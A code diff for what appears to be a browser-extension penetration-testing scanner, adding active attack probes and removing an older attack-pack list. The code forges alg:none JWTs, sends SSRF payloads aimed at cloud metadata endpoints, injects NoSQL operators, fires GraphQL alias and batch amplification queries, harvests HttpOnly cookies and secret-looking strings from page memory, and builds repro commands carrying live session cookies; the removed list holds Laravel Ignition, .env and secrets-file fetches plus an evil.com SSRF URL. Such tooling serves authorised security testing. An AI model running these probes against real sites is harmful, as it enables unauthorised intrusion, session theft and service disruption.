+      if(sv&&sv.indexOf("eyJ")===0&&sv.indexOf(".")>-1&&sv.length<8000)jwtTokens.push({value:sv,source:"sessionStorage."+sk});
+    }
+  }catch(e){}
   if(jwtTokens.length>0&&ctx.apiPaths.length>0){
     try{
       var jParts=jwtTokens[0].value.split(".");
@@ -2127,7 +2392,25 @@ if(ctx.aggroLevel==="full"){
       var testUrl2=location.origin+ctx.apiPaths[0];
       var origResp2=await sf(testUrl2,{headers:{"Authorization":"Bearer "+jwtTokens[0].value}},1000);
       var noneResp=await sf(testUrl2,{headers:{"Authorization":"Bearer "+noneToken}},1000);
-      R.jwtAlgResults.push({endpoint:ctx.apiPaths[0],originalAlg:origAlg,testedAlg:"none",originalStatus:origResp2.status,noneStatus:noneResp.status,accepted:noneResp.status===200,severity:noneResp.status===200?"critical":"info"});
+      var omitAuthOpts={headers:{"Authorization":"Bearer "+noneToken},credentials:"omit"};
+      var noneNoCookieResp=await sf(testUrl2,omitAuthOpts,1000);
+      var origStatus=origResp2.status;
+      var noneStatus=noneResp.status;
+      var noneOmitStatus=noneNoCookieResp.status;
+      var accepted=noneStatus===200&&noneOmitStatus===200;
+      var partialAccept=noneStatus===200&&noneOmitStatus!==200;
+      R.jwtAlgResults.push({
+        endpoint:ctx.apiPaths[0],
+        tokenSource:jwtTokens[0].source,
+        originalAlg:origAlg,
+        testedAlg:"none",
+        originalStatus:origStatus,
+        noneStatus:noneStatus,
+        noneOmitCookieStatus:noneOmitStatus,
+        accepted:accepted,
+        precedence:accepted?"jwt-trusted-on-its-own":(partialAccept?"server-fell-back-to-cookie":"jwt-rejected"),
+        severity:accepted?"critical":(partialAccept?"medium":"info")
+      });
     }catch(e){R.errors.push("JWT alg: "+e.message);}
   }
 }
@@ -2165,7 +2448,9 @@ if(ctx.aggroLevel!=="careful"){
   var idorPathEps=ctx.pathParams.slice(0,20);
   for(var idi=0;idi<idorPathEps.length;idi++){
     var idEp=idorPathEps[idi];
+    if(!idEp||typeof idEp.paramIndex!=="number"||idEp.paramIndex<=0)continue;
     var idSegments=idEp.path.split("/");
+    if(idEp.paramIndex>=idSegments.length)continue;
     var origId=idSegments[idEp.paramIndex];
     if(!origId)continue;
     var testIds=[];
@@ -3017,10 +3302,233 @@ if(ctx.aggroLevel==="full"){
   }
 }
 
+R.errors.push("STEP 37: SSRF Param Probing");
+R.ssrfResults=[];
+if(ctx.aggroLevel!=="careful"){
+  var SSRF_PARAMS=["url","uri","src","source","target","dest","destination","redirect","redirect_uri","redirectUri","next","continue","return","return_to","returnTo","callback","callbackUrl","webhook","webhook_url","image","img","fetch","proxy","host","domain","site","feed","reference","ref","load","import"];
+  var SSRF_PAYLOADS=["http://169.254.169.254/latest/meta-data/","http://[::ffff:127.0.0.1]/","http://localhost:80/","http://metadata.google.internal/computeMetadata/v1/"];
+  var ssrfTargets=ctx.observedApis.filter(function(e){return e.method==="GET";}).slice(0,8);
+  for(var sri=0;sri<ssrfTargets.length;sri++){
+    var sEp=ssrfTargets[sri];
+    for(var spi=0;spi<SSRF_PARAMS.length;spi++){
+      var sp=SSRF_PARAMS[spi];
+      var payload=SSRF_PAYLOADS[spi%SSRF_PAYLOADS.length];
+      var sep=sEp.query?"&":"?";
+      var ssrfUrl=location.origin+sEp.path+(sEp.query||"")+sep+sp+"="+encodeURIComponent(payload);
+      try{
+        var ssrfResp=await sf(ssrfUrl,null,5000);
+        if(ssrfResp.status===0)continue;
+        var hits=/instance-id|metadata-flavor|computeMetadata|169\.254\.169\.254|ami-id|iam\/security-credentials|access-token/i.test(ssrfResp.body||"");
+        if(hits){
+          R.ssrfResults.push({path:sEp.path,param:sp,payload:payload,status:ssrfResp.status,size:(ssrfResp.body||"").length,reflectedMetadata:true,severity:"critical",note:"Cloud metadata content reflected — confirmed SSRF"});
+        }
+      }catch(e){}
+      if(spi%6===5)await delay(80);
+    }
+  }
+}
+
+R.errors.push("STEP 38: NoSQL Operator Injection");
+R.nosqlResults=[];
+if(ctx.aggroLevel!=="careful"){
+  var nosqlTargets=ctx.postBodiesCtx.filter(function(p){
+    if(!p.body||(p.contentType||"").indexOf("json")===-1)return false;
+    try{var j=JSON.parse(p.body);return j&&typeof j==="object";}catch(e){return false;}
+  }).slice(0,5);
+  var nosqlOps=[{$ne:null},{$gt:""},{$exists:true}];
+  for(var ni=0;ni<nosqlTargets.length;ni++){
+    var nEp=nosqlTargets[ni];
+    var nUrl=nEp.url||(location.origin+nEp.path);
+    try{
+      var nObj=JSON.parse(nEp.body);
+      var keys=Object.keys(nObj);
+      var idKey=keys.find(function(k){return /id$|user|email|name/i.test(k);})||keys[0];
+      if(!idKey)continue;
+      for(var noi=0;noi<nosqlOps.length;noi++){
+        var injected=Object.assign({},nObj);
+        injected[idKey]=nosqlOps[noi];
+        var origResp=await sf(nUrl,{method:nEp.method||"POST",headers:{"Content-Type":"application/json"},body:nEp.body},3000);
+        var injResp=await sf(nUrl,{method:nEp.method||"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(injected)},3000);
+        if(origResp.status>0&&injResp.status===200&&injResp.body!==origResp.body){
+          var sizeDelta=Math.abs((injResp.body||"").length-(origResp.body||"").length);
+          if(sizeDelta>20){
+            R.nosqlResults.push({path:nEp.path,field:idKey,operator:Object.keys(nosqlOps[noi])[0],origStatus:origResp.status,injStatus:injResp.status,sizeDelta:sizeDelta,severity:sizeDelta>200?"high":"medium"});
+            break;
+          }
+        }
+      }
+    }catch(e){}
+    if(ni%2===1)await delay(150);
+  }
+}
+
+R.errors.push("STEP 39: GraphQL Alias Amplification");
+R.gqlAliasResults=[];
+if(ctx.aggroLevel==="full"&&R.graphql&&R.graphql.endpoint){
+  var gaUrl=R.graphql.endpoint.startsWith("http")?R.graphql.endpoint:location.origin+R.graphql.endpoint;
+  var firstField=(R.graphql.queryFields||[])[0];
+  if(firstField&&firstField.name){
+    try{
+      var aliases=[];
+      for(var ai=0;ai<50;ai++)aliases.push("a"+ai+":"+firstField.name+"{__typename}");
+      var aliasQuery="{"+aliases.join(" ")+"}";
+      var t0=Date.now();
+      var aliasResp=await sf(gaUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({query:aliasQuery})},50000);
+      var dt=Date.now()-t0;
+      if(aliasResp.status===200&&aliasResp.body&&aliasResp.body.length>1000){
+        var dataMatches=(aliasResp.body.match(/__typename/g)||[]).length;
+        R.gqlAliasResults.push({endpoint:R.graphql.endpoint,aliasCount:50,timeMs:dt,bodyLen:aliasResp.body.length,typenames:dataMatches,severity:dataMatches>=40?"medium":"info",note:dataMatches>=40?"Server processed all aliased queries — DoS amplification possible":"Server limited the response — likely depth/alias caps"});
+      }
+    }catch(e){R.errors.push("GQL alias: "+e.message);}
+  }
+}
+
+R.errors.push("STEP 40: GraphQL Batch Amplification");
+R.gqlBatchResults=[];
+if(ctx.aggroLevel==="full"&&R.graphql&&R.graphql.endpoint){
+  var gbUrl=R.graphql.endpoint.startsWith("http")?R.graphql.endpoint:location.origin+R.graphql.endpoint;
+  var firstField2=(R.graphql.queryFields||[])[0];
+  if(firstField2&&firstField2.name){
+    try{
+      var batch=[];
+      for(var bi=0;bi<25;bi++)batch.push({query:"{"+firstField2.name+"{__typename}}"});
+      var t1=Date.now();
+      var batchResp=await sf(gbUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(batch)},50000);
+      var dt2=Date.now()-t1;
+      if(batchResp.status===200&&batchResp.body){
+        var batchAccepted=batchResp.body.charAt(0)==="["||(batchResp.body.match(/__typename/g)||[]).length>=20;
+        R.gqlBatchResults.push({endpoint:R.graphql.endpoint,batchSize:25,timeMs:dt2,bodyLen:batchResp.body.length,severity:batchAccepted?"medium":"info",note:batchAccepted?"Server accepted batched queries — DoS amplification possible":"Server rejected batch shape"});
+      }
+    }catch(e){R.errors.push("GQL batch: "+e.message);}
+  }
+}
+
+R.errors.push("STEP 41: Cache Deception");
+R.cacheDeceptionResults=[];
+if(ctx.aggroLevel!=="careful"){
+  var cdTargets=ctx.observedApis.filter(function(e){return e.method==="GET"&&!/\.(?:js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map)$/i.test(e.path);}).slice(0,8);
+  var cdSuffixes=["/avatar.css","/avatar.js","/style.css","/script.js"];
+  for(var cdi=0;cdi<cdTargets.length;cdi++){
+    var cdEp=cdTargets[cdi];
+    for(var cdsi=0;cdsi<cdSuffixes.length;cdsi++){
+      try{
+        var deceitUrl=location.origin+cdEp.path.replace(/\/$/,"")+cdSuffixes[cdsi];
+        var deceitResp=await sf(deceitUrl,null,3000);
+        if(deceitResp.status>=200&&deceitResp.status<300&&deceitResp.body&&deceitResp.body.length>30){
+          var ct=(deceitResp.ct||"").toLowerCase();
+          var looksJson=ct.indexOf("json")>-1||deceitResp.body.charAt(0)==="{";
+          var hasCachePub=ct.indexOf("html")>-1;
+          if(looksJson||hasCachePub){
+            R.cacheDeceptionResults.push({basePath:cdEp.path,deceitPath:cdEp.path+cdSuffixes[cdsi],status:deceitResp.status,contentType:deceitResp.ct,bodyPreview:deceitResp.body.substring(0,200),severity:looksJson?"high":"medium",note:looksJson?"Static-extension URL returns JSON — sensitive content cached":"Static-extension URL returns content — investigate cache-control"});
+            break;
+          }
+        }
+      }catch(e){}
+    }
+    if(cdi%3===2)await delay(80);
+  }
+}
+
+R.errors.push("STEP 42: Subdomain Takeover Heuristic");
+R.subdomainTakeoverResults=[];
+if(R.subdomains&&R.subdomains.length){
+  var TAKEOVER_SIGS=[
+    {pattern:/There isn't a GitHub Pages site here/i,service:"GitHub Pages"},
+    {pattern:/<Code>NoSuchBucket<\/Code>/i,service:"AWS S3"},
+    {pattern:/no such app|no such heroku/i,service:"Heroku"},
+    {pattern:/The specified bucket does not exist/i,service:"GCS"},
+    {pattern:/<title>Site not found/i,service:"Netlify"},
+    {pattern:/Project not found|<title>404 Project Not Found/i,service:"Vercel/GitLab Pages"},
+    {pattern:/Repository not found/i,service:"Bitbucket Pages"},
+    {pattern:/Sorry, this shop is currently unavailable/i,service:"Shopify"},
+    {pattern:/Trying to access array offset on value of type null/i,service:"Generic 5xx"},
+    {pattern:/Domain not found|Domain mapping upgrade/i,service:"Generic CDN"}
+  ];
+  var subsToCheck=R.subdomains.slice(0,15);
+  for(var sti=0;sti<subsToCheck.length;sti++){
+    var sub=subsToCheck[sti];
+    var subUrl="https://"+sub.host+"/";
+    try{
+      var subResp=await sf(subUrl,{method:"GET"},5000);
+      if(subResp.status===0)continue;
+      var match=null;
+      for(var sigi=0;sigi<TAKEOVER_SIGS.length;sigi++){
+        if(TAKEOVER_SIGS[sigi].pattern.test(subResp.body||"")){match=TAKEOVER_SIGS[sigi];break;}
+      }
+      if(match){
+        R.subdomainTakeoverResults.push({host:sub.host,status:subResp.status,service:match.service,bodyPreview:(subResp.body||"").substring(0,300),severity:"high",note:"Possible subdomain takeover — verify ownership of dangling resource on "+match.service});
+      }
+    }catch(e){}
+    if(sti%4===3)await delay(150);
+  }
+}
+
+R.errors.push("STEP 43: TabNabbing Detection");
+R.tabNabbingResults=[];
+try{
+  var anchors=document.querySelectorAll('a[target="_blank"]');
+  var unsafe=[];
+  for(var ti=0;ti<anchors.length&&unsafe.length<50;ti++){
+    var a=anchors[ti];
+    var rel=(a.getAttribute("rel")||"").toLowerCase();
+    if(rel.indexOf("noopener")===-1&&rel.indexOf("noreferrer")===-1){
+      var href=a.getAttribute("href")||"";
+      if(href.startsWith("http")){
+        try{
+          var hostA=new URL(href).hostname;
+          if(hostA&&hostA!==location.hostname)unsafe.push({href:href.substring(0,200),host:hostA,text:(a.textContent||"").trim().substring(0,80)});
+        }catch(e){}
+      }
+    }
+  }
+  if(unsafe.length){
+    R.tabNabbingResults.push({count:unsafe.length,examples:unsafe.slice(0,10),severity:unsafe.length>5?"medium":"low",note:"Cross-origin _blank links without rel=noopener — opener can navigate the parent tab"});
+  }
+}catch(e){R.errors.push("TabNabbing: "+e.message);}
+
+R.errors.push("STEP 44: postMessage Origin-Check Correlation");
+R.postMessageRiskResults=[];
+try{
+  var pmCount=0,unsafePm=0;
+  var safetyRe=/(?:\.origin|event\.origin|e\.origin|msg\.origin|ev\.origin)\s*[!=]==?\s*['"]/;
+  document.querySelectorAll("script:not([src])").forEach(function(s){
+    var t=s.textContent||"";
+    if(t.length<10)return;
+    var matchRe=/addEventListener\s*\(\s*['"]message['"]/g;
+    var m;
+    while((m=matchRe.exec(t))!==null){
+      pmCount++;
+      var idx=m.index;
+      var window_=t.substring(idx,Math.min(t.length,idx+800));
+      if(!safetyRe.test(window_))unsafePm++;
+    }
+  });
+  if(pmCount){
+    R.postMessageRiskResults.push({totalListeners:pmCount,withoutOriginCheck:unsafePm,severity:unsafePm>0?"high":"info",note:unsafePm>0?unsafePm+" of "+pmCount+" postMessage listeners have no origin check — XSS via postMessage":"All listeners validate origin"});
+  }
+}catch(e){R.errors.push("postMsg: "+e.message);}
+
+R.errors.push("STEP 45: Service Worker Scope Abuse");
+R.swScopeResults=[];
+try{
+  if(navigator.serviceWorker&&navigator.serviceWorker.getRegistrations){
+    var regs=await navigator.serviceWorker.getRegistrations();
+    regs.forEach(function(r){
+      if(!r||!r.scope)return;
+      var scopePath="";try{scopePath=new URL(r.scope).pathname;}catch(e){scopePath=r.scope;}
+      var scriptUrl=r.active?r.active.scriptURL:(r.installing?r.installing.scriptURL:"");
+      var risk=scopePath==="/"?"high":scopePath.length<=3?"medium":"low";
+      R.swScopeResults.push({scope:r.scope,scriptUrl:scriptUrl,scopePath:scopePath,severity:risk,note:risk==="high"?"SW scope is /, intercepts entire origin":risk==="medium"?"SW scope is broad — review handlers":"Narrow scope"});
+    });
+  }
+}catch(e){R.errors.push("SW scope: "+e.message);}
+
 }catch(topErr){
   R.errors.push("FATAL: "+topErr.message+" at "+(topErr.stack||"").substring(0,200));
+}finally{
+  try{delete window.__ps_ctx;}catch(_e){try{window.__ps_ctx=void 0;}catch(_e2){}}
 }
-return JSON.stringify(R);
+return _J?_J.stringify(R):'{"errors":["JSON unavailable on return"]}';
 })()`;
 
   return new Promise(resolve=>{
@@ -3058,6 +3566,7 @@ return JSON.stringify(R);
       returnByValue:true,
       timeout:180000
     },(result)=>{
+      try{chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{expression:"try{delete window.__ps_ctx;}catch(_e){try{window.__ps_ctx=void 0;}catch(_e2){}}void 0",returnByValue:true},()=>{void chrome.runtime.lastError;});}catch(_e){}
       if(chrome.runtime.lastError){
         const err="PROBE FAIL [Phase 3: eval chrome error]: "+JSON.stringify(chrome.runtime.lastError);
         console.error('[PenScope]',err);
@@ -3163,72 +3672,14 @@ return JSON.stringify(R);
   });
 }
 
-// v6.0 — STACK_ATTACK_PACKS dictionary. Mirror of red-attacks.js. When you add a pack
-// here, also add it to red-attacks.js so external tooling can read it standalone.
+// STACK_ATTACK_PACKS dictionary — defined in src/probe/stack-packs.js, imported at top
+// of this file. (red-attacks.js was the standalone copy; removed in Phase 6.)
 //
 // Schema: each step is {step, method, path, body?, expect?, severity?, custom?}. The
 // runner POSTs/GETs each path with credentials:'include' + custom headers, then checks
 // the response: if `expect` substring matches in body, mark the step as confirmed at
 // the given severity (default "medium"). For `custom` steps with no path, a special
 // branch in the runner handles them (e.g. graphql field fuzzing using the symbol table).
-const STACK_ATTACK_PACKS={
-  laravel:[
-    {step:"laravel-debug",method:"GET",path:"/?XDEBUG_SESSION_START=1",expect:["whoops","Stack trace"]},
-    {step:"laravel-ignition",method:"POST",path:"/_ignition/execute-solution",body:{solution:"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",parameters:{viewFile:"phpinfo()",variableName:"a"}},severity:"critical"},
-    {step:"laravel-telescope",method:"GET",path:"/telescope",expect:["<title>Telescope"]},
-    {step:"laravel-horizon",method:"GET",path:"/horizon",expect:["Horizon"]},
-    {step:"laravel-env",method:"GET",path:"/.env",expect:["APP_KEY=","DB_PASSWORD"],severity:"critical"},
-    {step:"laravel-storage",method:"GET",path:"/storage/logs/laravel.log"},
-    {step:"laravel-debugbar",method:"GET",path:"/_debugbar/open",expect:["debugbar"]},
-  ],
-  spring:[
-    {step:"spring-actuator",method:"GET",path:"/actuator"},
-    {step:"spring-heapdump",method:"GET",path:"/actuator/heapdump",severity:"critical"},
-    {step:"spring-env",method:"GET",path:"/actuator/env"},
-    {step:"spring-mappings",method:"GET",path:"/actuator/mappings"},
-    {step:"spring-trace",method:"GET",path:"/actuator/trace"},
-    {step:"spring-jolokia",method:"GET",path:"/jolokia/list"},
-    {step:"spring-h2-console",method:"GET",path:"/h2-console"},
-    {step:"spring-loggers",method:"GET",path:"/actuator/loggers"},
-    {step:"spring-beans",method:"GET",path:"/actuator/beans"},
-  ],
-  rails:[
-    {step:"rails-secrets",method:"GET",path:"/config/secrets.yml",severity:"critical"},
-    {step:"rails-routes",method:"GET",path:"/rails/info/routes"},
-    {step:"rails-properties",method:"GET",path:"/rails/info/properties"},
-    {step:"rails-dj-console",method:"GET",path:"/admin/jobs"},
-    {step:"rails-database",method:"GET",path:"/config/database.yml",severity:"critical"},
-  ],
-  aspnet:[
-    {step:"aspnet-trace",method:"GET",path:"/trace.axd"},
-    {step:"aspnet-elmah",method:"GET",path:"/elmah.axd"},
-    {step:"aspnet-debug",method:"GET",path:"/?DEBUG=1"},
-    {step:"aspnet-bin",method:"GET",path:"/bin/"},
-    {step:"aspnet-webconfig",method:"GET",path:"/web.config"},
-  ],
-  django:[
-    {step:"django-debug",method:"GET",path:"/?debug=1",expect:["Django","DEBUG = True"]},
-    {step:"django-admin",method:"GET",path:"/admin/"},
-    {step:"django-static",method:"GET",path:"/static/admin/css/base.css"},
-    {step:"django-traceback",method:"GET",path:"/__debug__/",custom:"trigger-500-look-for-traceback"},
-  ],
-  nextjs:[
-    {step:"nextjs-build-manifest",method:"GET",path:"/_next/static/development/_buildManifest.js"},
-    {step:"nextjs-data",method:"GET",path:"/_next/data/"},
-    {step:"nextjs-image",method:"GET",path:"/_next/image?url=https%3A%2F%2Fevil.com%2Fimg.png&w=64&q=75",custom:"check-image-optimizer-ssrf"},
-  ],
-  graphql:[
-    {step:"graphql-introspect",method:"POST",path:"/graphql",body:{query:"{__schema{queryType{name} mutationType{name} types{name kind}}}"}},
-    {step:"graphql-batching",method:"POST",path:"/graphql",body:[{query:"{__typename}"},{query:"{__typename}"}],custom:"send-array-of-queries"},
-    {step:"graphql-field-fuzz",method:"POST",path:"/graphql",custom:"use-symbol-table-as-field-dict"},
-  ],
-  wordpress:[
-    {step:"wp-rest-users",method:"GET",path:"/wp-json/wp/v2/users"},
-    {step:"wp-xmlrpc",method:"POST",path:"/xmlrpc.php",body:'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'},
-    {step:"wp-readme",method:"GET",path:"/readme.html"},
-    {step:"wp-admin-ajax",method:"GET",path:"/wp-admin/admin-ajax.php?action="},
-  ],
-};
 
 // Normalize tech-stack name (e.g. "Laravel 9.x", "Spring Boot 2.7", "ASP.NET MVC")
 // to a STACK_ATTACK_PACKS key. Returns null when no pack matches.
@@ -3573,12 +4024,17 @@ function mineMemoryStrings(tabId){
         if(t==="number"||t==="boolean")return;
         if(t==="function"){try{scan(obj.toString().substring(0,5000),path+"()");}catch(e){}return;}
         if(t!=="object")return;
-        // Try JSON.stringify for a single-pass scan of the entire subtree
         try{
-          var s=JSON.stringify(obj);
-          if(s&&s.length<200000){scan(s,path);return;}
+          var keyCount;
+          if(Array.isArray(obj)){keyCount=obj.length;}
+          else{try{keyCount=Object.keys(obj).length;}catch(e){keyCount=0;}}
+          if(keyCount>=1000){
+            try{found.push({type:"oversized-object-skipped",value:"["+keyCount+" keys]",source:path,severity:"info",length:0});}catch(e){}
+          }else{
+            var s=JSON.stringify(obj);
+            if(s&&s.length<200000){scan(s,path);return;}
+          }
         }catch(e){}
-        // Fallback: walk manually if stringify fails (circular) or the object is huge
         try{
           var keys=Array.isArray(obj)?obj.slice(0,20).map(function(_,i){return i;}):Object.keys(obj).slice(0,60);
           for(var i=0;i<keys.length&&found.length<300;i++){
@@ -3589,7 +4045,11 @@ function mineMemoryStrings(tabId){
       var skip={chrome:1,document:1,window:1,self:1,top:1,parent:1,frames:1,location:1,navigator:1,performance:1,screen:1,history:1,console:1,localStorage:1,sessionStorage:1,fetch:1,XMLHttpRequest:1,Array:1,Object:1,String:1,Number:1,Boolean:1,Function:1,RegExp:1,Date:1,Math:1,JSON:1,Promise:1,Map:1,Set:1,WeakMap:1,WeakSet:1,Symbol:1,Proxy:1,Reflect:1,Error:1,Buffer:1};
       // Walk all window properties to 6 levels deep (via JSON.stringify)
       try{
-        var winKeys=Object.getOwnPropertyNames(window).slice(0,500);
+        var allKeys=Object.getOwnPropertyNames(window);
+        var interestingRe=/auth|api|key|token|secret|config|user|admin|role|session|cred|env|vault|store|state|app|client|jwt|bearer|password|sso|oauth|saml/i;
+        var winKeys=[];
+        for(var ak=0;ak<allKeys.length&&winKeys.length<2000;ak++){if(interestingRe.test(allKeys[ak]))winKeys.push(allKeys[ak]);}
+        for(var ak2=0;ak2<allKeys.length&&winKeys.length<2000;ak2++){if(!interestingRe.test(allKeys[ak2]))winKeys.push(allKeys[ak2]);}
         for(var wi=0;wi<winKeys.length;wi++){
           var k=winKeys[wi];
           if(skip[k]||k.charAt(0)==="_"&&k.charAt(1)!=="_")continue;
@@ -4972,34 +5432,87 @@ function extractHttpOnlyCookies(tabId){
   if(!url||!url.startsWith("http"))return;
   chrome.debugger.sendCommand({tabId},"Network.getCookies",{urls:[url]},(result)=>{
     if(chrome.runtime.lastError||!result||!result.cookies)return;
+    if(!Array.isArray(tab.cookies))tab.cookies=[];
+    const byName={};tab.cookies.forEach(c=>{byName[c.name]=c;});
     result.cookies.forEach(c=>{
-      tab.httpOnlyCookies.push({
+      const enriched={
         name:c.name,
-        value:c.value.substring(0,200),
+        value:(c.value||"").substring(0,200),
         domain:c.domain,
         path:c.path,
-        httpOnly:c.httpOnly,
-        secure:c.secure,
+        httpOnly:!!c.httpOnly,
+        secure:!!c.secure,
         sameSite:c.sameSite||"None",
         expires:c.expires>0?new Date(c.expires*1000).toISOString():"session",
+        expirationDate:c.expires||0,
+        session:!c.expires,
         size:c.size||0,
         priority:c.priority||"Medium",
-        // Flag security issues
-        issues:[]
-      });
-      const ck=tab.httpOnlyCookies[tab.httpOnlyCookies.length-1];
-      if(!c.httpOnly)ck.issues.push("No HttpOnly");
-      if(!c.secure)ck.issues.push("No Secure");
-      if(!c.sameSite||c.sameSite==="None")ck.issues.push("SameSite=None");
-      if(c.value.length>100)ck.issues.push("Large value ("+c.value.length+" chars)");
-      // Detect auth cookies by name
+        issues:[],
+        source:"cdp"
+      };
+      if(!c.httpOnly)enriched.issues.push("No HttpOnly");
+      if(!c.secure)enriched.issues.push("No Secure");
+      if(!c.sameSite||c.sameSite==="None")enriched.issues.push("SameSite=None");
+      if((c.value||"").length>100)enriched.issues.push("Large value ("+c.value.length+" chars)");
       const ln=c.name.toLowerCase();
-      if(ln.indexOf("session")>-1||ln.indexOf("auth")>-1||ln.indexOf("token")>-1||ln.indexOf("jwt")>-1||ln.indexOf("identity")>-1||ln.indexOf("connect.sid")>-1||ln.indexOf("csrf")>-1)ck.isAuthCookie=true;
+      if(ln.indexOf("session")>-1||ln.indexOf("auth")>-1||ln.indexOf("token")>-1||ln.indexOf("jwt")>-1||ln.indexOf("identity")>-1||ln.indexOf("connect.sid")>-1||ln.indexOf("csrf")>-1)enriched.isAuthCookie=true;
+      tab.httpOnlyCookies.push(enriched);
+      if(byName[c.name]){
+        Object.assign(byName[c.name],{httpOnly:enriched.httpOnly,secure:enriched.secure,sameSite:enriched.sameSite,issues:enriched.issues,isAuthCookie:enriched.isAuthCookie,source:"cdp+chrome.cookies"});
+      }else{
+        tab.cookies.push(enriched);byName[c.name]=enriched;
+      }
     });
   });
 }
 
-// #9: Auto-extract API response schemas from captured JSON responses
+function extractAriaLabels(tabId){
+  if(!_debugTabs.has(tabId))return;
+  const tab=T(tabId);
+  if(tab._ariaExtracted)return;
+  tab._ariaExtracted=true;
+  const _disableAcc=()=>{try{chrome.debugger.sendCommand({tabId},"Accessibility.disable",{},()=>{void chrome.runtime.lastError;});}catch(e){}};
+  chrome.debugger.sendCommand({tabId},"Accessibility.enable",{},()=>{
+    if(chrome.runtime.lastError){tab._ariaExtracted=false;return;}
+    chrome.debugger.sendCommand({tabId},"Accessibility.getFullAXTree",{depth:-1},(res)=>{
+      if(chrome.runtime.lastError||!res||!Array.isArray(res.nodes)){_disableAcc();return;}
+      const labels=[];const seen=new Set();
+      const SENS=/admin|impersonate|sudo|delete|destroy|revoke|disable|reset|approve|reject|invoice|billing|payment|refund|export|backup|grant|owner|manage|moderat|debug|internal/i;
+      for(let i=0;i<res.nodes.length&&labels.length<500;i++){
+        const n=res.nodes[i];
+        if(!n||!n.name||!n.name.value)continue;
+        const v=String(n.name.value).trim();
+        if(!v||v.length<3||v.length>200)continue;
+        const role=n.role&&n.role.value||"";
+        const key=role+":"+v.substring(0,80);
+        if(seen.has(key))continue;seen.add(key);
+        const sensitive=SENS.test(v);
+        labels.push({label:v.substring(0,200),role:String(role).substring(0,40),sensitive:sensitive,severity:sensitive?"medium":"info"});
+      }
+      tab.ariaLabels=labels;
+      _disableAcc();
+    });
+  });
+}
+function extractPartitionedCookies(tabId){
+  if(!_debugTabs.has(tabId))return;
+  const tab=T(tabId);
+  if(tab._partitionedCookiesExtracted)return;
+  tab._partitionedCookiesExtracted=true;
+  chrome.debugger.sendCommand({tabId},"Storage.getCookies",{},(res)=>{
+    if(chrome.runtime.lastError||!res||!Array.isArray(res.cookies))return;
+    const partitioned=res.cookies.filter(c=>c&&c.partitionKey).map(c=>({
+      name:c.name,domain:c.domain,path:c.path,
+      secure:!!c.secure,httpOnly:!!c.httpOnly,sameSite:c.sameSite||"unset",
+      partitionKey:c.partitionKey,
+      valueLen:typeof c.value==="string"?c.value.length:0,
+      severity:"info"
+    }));
+    if(partitioned.length)tab.partitionedCookies=partitioned;
+  });
+}
+
 function extractResponseSchemas(tabId){
   if(!_debugTabs.has(tabId))return;
   const tab=T(tabId);
@@ -5321,8 +5834,11 @@ function analyzeExploitChains(tabId){
   // not a server path. Treating the hash as part of the URL produces nonsense findings
   // like "auth bypass on /Dashboard#!/" when the actual server endpoint is /Dashboard.
   function cleanPath(p){if(!p)return p;const h=p.indexOf("#");return h>=0?p.substring(0,h):p;}
-  const authCookie=(tab.cookies||[]).filter(c=>/identity|idsrv|session|auth|token|jwt|cookie/i.test(c.name)).slice(0,3).map(c=>`${c.name}=${(c.value||"").substring(0,50)}`).join("; ");
-  const cookieFlag=authCookie?`-b "${authCookie}"`:"";
+  const authCookieList=(tab.cookies||[]).filter(c=>/identity|idsrv|session|auth|token|jwt|cookie/i.test(c.name)).slice(0,3);
+  const authCookieLive=authCookieList.map(c=>`${c.name}=${(c.value||"").substring(0,50)}`).join("; ");
+  const authCookieRedacted=authCookieList.map(c=>`${c.name}=<REDACTED-${c.name}>`).join("; ");
+  const cookieFlag=authCookieRedacted?`-b "${authCookieRedacted}"`:"";
+  const cookieFlagLive=authCookieLive?`-b "${authCookieLive}"`:"";
 
   // === Chain 1: Confirmed auth bypass + sensitive endpoint name ===
   // If probe found a path that returns 200 without auth AND the path name suggests sensitive
@@ -5605,8 +6121,13 @@ function analyzeExploitChains(tabId){
       return sb-sa;
     });
   }catch(e){console.warn('[PenScope] chain sort',e.message||e);}
-  // Cap chain list size before assignment — persistence trim would do this anyway but we
-  // don't want the render to iterate 100+ chains either.
+  if(authCookieRedacted&&authCookieLive&&authCookieRedacted!==authCookieLive){
+    chains.forEach(ch=>{
+      if(ch&&typeof ch.reproCmd==="string"&&ch.reproCmd.indexOf(authCookieRedacted)>-1){
+        ch._liveReproCmd=ch.reproCmd.split(authCookieRedacted).join(authCookieLive);
+      }
+    });
+  }
   tab.exploitChains=chains.slice(0,50);
 }
 
@@ -5627,6 +6148,8 @@ function runPassiveAnalysis(tabId){
     extractRealEventListeners(tabId);
     extractHttpOnlyCookies(tabId);
     extractHeapSecrets(tabId);
+    try{extractAriaLabels(tabId);}catch(e){}
+    try{extractPartitionedCookies(tabId);}catch(e){}
   }
   if(!tab._schemasExtracted&&tab.apiResponseBodies.length>0){
     tab._schemasExtracted=true;
@@ -5637,14 +6160,60 @@ function runPassiveAnalysis(tabId){
 // -------------------------------------------------------
 // 4. TAB LIFECYCLE
 // -------------------------------------------------------
-chrome.tabs.onRemoved.addListener(tabId=>{if(_debugTabs.has(tabId)){try{chrome.debugger.detach({tabId});}catch(e){console.warn('[PenScope] detach on remove',e.message||e);}_debugTabs.delete(tabId);}delete state[tabId];delete _scripts[tabId];Object.keys(_seen).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _seen[k];});Object.keys(_pending).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _pending[k];});try{chrome.storage.session.remove(`ps:tab:${tabId}`);}catch(e){}});
-chrome.tabs.onUpdated.addListener((tabId,changeInfo)=>{if(changeInfo.status==="loading"&&changeInfo.url){const wasDeep=state[tabId]?.deepEnabled;delete state[tabId];if(_scripts[tabId])_scripts[tabId]=new Map();Object.keys(_seen).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _seen[k];});Object.keys(_pending).forEach(k=>{if(k.startsWith(`${tabId}:`))delete _pending[k];});const t=T(tabId);t.url=changeInfo.url;t.deepEnabled=wasDeep;}if(changeInfo.url&&state[tabId])state[tabId].url=changeInfo.url;
-  // v5: Trigger script extraction after page finishes loading
+chrome.tabs.onRemoved.addListener(tabId=>{
